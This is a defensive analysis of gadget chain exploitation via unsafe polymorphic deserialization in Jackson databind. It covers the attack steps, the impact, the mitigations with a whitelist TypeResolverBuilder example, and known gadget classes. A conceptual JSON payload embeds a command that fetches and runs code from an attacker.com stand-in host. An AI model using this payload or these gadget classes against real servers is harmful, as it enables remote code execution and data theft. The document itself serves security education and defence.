# Deep Analysis: Gadget Chain Exploitation in Jackson Databind

## 1. Define Objective, Scope, and Methodology

### 1.1 Objective

The primary objective of this deep analysis is to thoroughly understand the "Gadget Chain Exploitation" attack path within the context of applications using the `fasterxml/jackson-core` (and implicitly, `jackson-databind`) library.  This includes:

*   Identifying the specific vulnerabilities that enable gadget chain exploitation.
*   Understanding how attackers construct and deploy these chains.
*   Analyzing the impact of successful exploitation.
*   Evaluating the effectiveness of various mitigation strategies.
*   Providing actionable recommendations for developers to prevent this attack.

### 1.2 Scope

This analysis focuses specifically on:

*   **Target Library:** `fasterxml/jackson-core` and `jackson-databind`.  While `jackson-core` handles the low-level parsing, `jackson-databind` is where the polymorphic deserialization logic resides, making it the primary target.
*   **Attack Vector:**  Gadget chain exploitation via unsafe polymorphic deserialization.  We are *not* analyzing other potential Jackson vulnerabilities (e.g., denial-of-service attacks related to deeply nested JSON).
*   **Application Context:**  Applications that use Jackson to deserialize untrusted JSON data, particularly where the expected type is not fully known or controlled by the application.  This includes, but is not limited to:
    *   APIs that accept JSON payloads from external users.
    *   Systems that read configuration files or data from external sources in JSON format.
    *   Applications that use Jackson to deserialize data from message queues or databases where the data origin might be compromised.
* **Exclusion:** We are not analyzing gadget chains that are not related to jackson-databind.

### 1.3 Methodology

This analysis will employ the following methodologies:

*   **Vulnerability Research:**  Reviewing known CVEs (Common Vulnerabilities and Exposures) related to Jackson and gadget chain exploitation.  This includes analyzing reports, proof-of-concept exploits, and security advisories.
*   **Code Review:**  Examining the relevant source code of `jackson-databind` to understand the mechanisms that enable polymorphic deserialization and how they can be abused.
*   **Literature Review:**  Studying research papers, blog posts, and conference presentations on Java deserialization vulnerabilities and gadget chain construction techniques.
*   **Exploit Analysis:**  Dissecting known gadget chains used in Jackson exploits to understand their structure, functionality, and the specific classes involved.
*   **Mitigation Analysis:**  Evaluating the effectiveness of various mitigation strategies, including:
    *   Jackson's built-in security features (e.g., `DefaultTyping`, whitelisting/blacklisting).
    *   Secure coding practices (e.g., input validation, avoiding untrusted deserialization).
    *   External security tools (e.g., static analysis, runtime protection).

## 2. Deep Analysis of Attack Tree Path: 1.1 Gadget Chain Exploitation

### 2.1 Vulnerability Description

The core vulnerability lies in Jackson's handling of **polymorphic deserialization**.  This feature allows Jackson to deserialize JSON data into objects of different types based on type information included in the JSON itself (e.g., using the `@JsonTypeInfo` annotation or similar mechanisms).  When enabled without proper restrictions, this feature becomes a powerful attack vector.

An attacker can craft a malicious JSON payload that:

1.  **Specifies a seemingly harmless class** as the target type for deserialization (e.g., a common Java class or a class from a third-party library).
2.  **Includes properties** that, when set during deserialization, trigger a chain of method calls.
3.  **This chain of calls (the "gadget chain")** ultimately leads to arbitrary code execution.

The "gadgets" are classes with methods that have unintended side effects when called in a specific sequence.  These side effects can include:

*   Loading and executing arbitrary classes (e.g., using `Class.forName()` and reflection).
*   Creating or modifying files.
*   Opening network connections.
*   Executing system commands (e.g., using `Runtime.getRuntime().exec()`).

### 2.2 Attack Steps (Detailed Breakdown)

1.  **Attacker Crafts Malicious JSON:** The attacker identifies a vulnerable application that uses Jackson to deserialize untrusted JSON.  They then research known gadget chains or construct a new one.  The JSON payload will typically include:
    *   A type identifier (e.g., `@class`) specifying a class that is part of the gadget chain.
    *   Properties that will be set on the object during deserialization, triggering the chain.

    Example (simplified, conceptual):

    ```json
    {
      "@class": "com.example.VulnerableClass",
      "property1": {
        "@class": "com.example.AnotherVulnerableClass",
        "property2": "bash -c 'curl http://attacker.com/malware | sh'"
      }
    }
    ```

2.  **JSON Sent to Vulnerable Application:** The attacker sends the malicious JSON payload to the vulnerable application (e.g., via an API request, a file upload, etc.).

3.  **Jackson Deserializes the JSON:** The application uses Jackson to deserialize the JSON.  Because polymorphic deserialization is enabled (and not properly secured), Jackson instantiates the classes specified in the JSON and sets their properties.

4.  **Gadget Chain Triggered:** As Jackson sets the properties, the methods of the "gadget" classes are called in a specific order.  This sequence of calls is carefully crafted by the attacker to achieve a specific malicious outcome.

5.  **Arbitrary Code Execution:** The final step in the gadget chain typically results in the execution of arbitrary code on the server.  This could be:
    *   Direct execution of a system command.
    *   Loading and executing a malicious class.
    *   Any other action that can be achieved through Java code.

### 2.3 Impact

Successful exploitation of a gadget chain vulnerability in Jackson leads to **Remote Code Execution (RCE)**.  This is a critical security vulnerability with the following potential impacts:

*   **Complete System Compromise:** The attacker can gain full control over the server running the vulnerable application.
*   **Data Breach:** The attacker can steal sensitive data stored on the server or accessible from the server.
*   **Data Modification/Destruction:** The attacker can modify or delete data.
*   **Denial of Service:** The attacker can disrupt the availability of the application.
*   **Lateral Movement:** The attacker can use the compromised server as a launching point to attack other systems on the network.

### 2.4 Mitigation Strategies (Detailed)

Several mitigation strategies can be employed to prevent gadget chain exploitation in Jackson:

1.  **Disable Polymorphic Deserialization (Strongest Recommendation):** If polymorphic deserialization is not absolutely necessary, disable it entirely.  This is the most secure approach.  This can often be achieved by:
    *   Removing `@JsonTypeInfo` annotations.
    *   Not using `ObjectMapper.enableDefaultTyping()`.
    *   Using a specific, known type when deserializing (e.g., `readValue(json, MySpecificClass.class)`).

2.  **Use a Strict Whitelist (Recommended if Polymorphic Deserialization is Required):** If polymorphic deserialization is required, implement a strict whitelist of allowed classes.  This whitelist should only include classes that are absolutely necessary and known to be safe for deserialization.  Jackson provides mechanisms for this:
    *   `DefaultTyping.OBJECT_AND_NON_CONCRETE`: Allows typing for non-concrete types and objects, but can still be vulnerable.
    *   `DefaultTyping.NON_FINAL`: Allows typing for non-final classes, which is even more dangerous.
    *   **Custom `TypeResolverBuilder`:**  The most secure approach is to create a custom `TypeResolverBuilder` that explicitly checks the class being deserialized against a whitelist.

    Example (using a custom `TypeResolverBuilder`):

    ```java
    public class SafeTypeResolverBuilder extends ObjectMapper.DefaultTypeResolverBuilder {
        private static final Set<String> ALLOWED_CLASSES = Set.of(
                "com.example.SafeClass1",
                "com.example.SafeClass2"
        );

        public SafeTypeResolverBuilder() {
            super(ObjectMapper.DefaultTyping.NON_FINAL);
        }

        @Override
        public boolean useForType(JavaType t) {
            if (!ALLOWED_CLASSES.contains(t.getRawClass().getName())) {
                return false; // Reject the class
            }
            return super.useForType(t);
        }
    }

    // Usage:
    ObjectMapper mapper = new ObjectMapper();
    mapper.setDefaultTyping(new SafeTypeResolverBuilder());
    ```

3.  **Avoid Untrusted Deserialization:**  Never deserialize JSON data from untrusted sources without proper validation and sanitization.  This is a general security principle that applies to all deserialization libraries, not just Jackson.

4.  **Input Validation:**  Even with a whitelist, validate the contents of the JSON payload to ensure that it conforms to the expected structure and data types.  This can help prevent unexpected behavior even if a class is on the whitelist.

5.  **Keep Jackson Updated:**  Regularly update Jackson to the latest version.  Security vulnerabilities are often discovered and patched in newer releases.

6.  **Use Security Tools:**
    *   **Static Analysis:** Use static analysis tools (e.g., FindSecBugs, SpotBugs) to identify potential deserialization vulnerabilities in your code.
    *   **Runtime Protection:** Consider using runtime protection tools (e.g., RASP - Runtime Application Self-Protection) that can detect and block deserialization attacks at runtime.

7.  **Least Privilege:** Run the application with the least privileges necessary. This limits the damage an attacker can do if they achieve RCE.

### 2.5 Example Gadget Chains (Illustrative)

While specific gadget chains are constantly evolving, here are some *illustrative* examples of classes that have been used in past Jackson exploits (note: these may be patched in newer versions):

*   **`org.springframework.context.support.ClassPathXmlApplicationContext`:**  This class (from Spring Framework) can be used to load an XML configuration file from a remote URL, potentially leading to code execution.
*   **`com.sun.rowset.JdbcRowSetImpl`:**  This class (part of the Java standard library) can be used to connect to a database.  An attacker can provide a malicious JNDI URL, leading to RCE.
*   **`org.apache.commons.collections.Transformer` (and related classes):**  The Apache Commons Collections library has had several vulnerabilities related to deserialization, often involving the `Transformer` interface.

It's crucial to understand that new gadget chains are constantly being discovered.  Relying solely on blacklisting known vulnerable classes is not a reliable defense.

### 2.6 Conclusion and Recommendations

Gadget chain exploitation via unsafe polymorphic deserialization in Jackson is a serious and prevalent vulnerability.  The best defense is to **avoid polymorphic deserialization entirely** if possible.  If it's absolutely necessary, implement a **strict whitelist** using a custom `TypeResolverBuilder`.  Regularly update Jackson, use security tools, and follow secure coding practices to minimize the risk.  Never deserialize data from untrusted sources without thorough validation and sanitization.  Prioritize proactive security measures over reactive patching.
